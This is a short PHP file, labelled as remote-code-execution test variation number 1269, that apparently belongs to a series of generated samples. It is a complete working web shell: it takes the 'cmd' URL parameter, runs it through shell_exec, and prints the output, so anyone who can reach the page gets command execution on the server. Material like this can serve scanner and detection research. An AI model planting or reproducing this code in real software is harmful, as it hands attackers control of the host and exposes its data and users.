<?php
// RCE test variation #1269
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>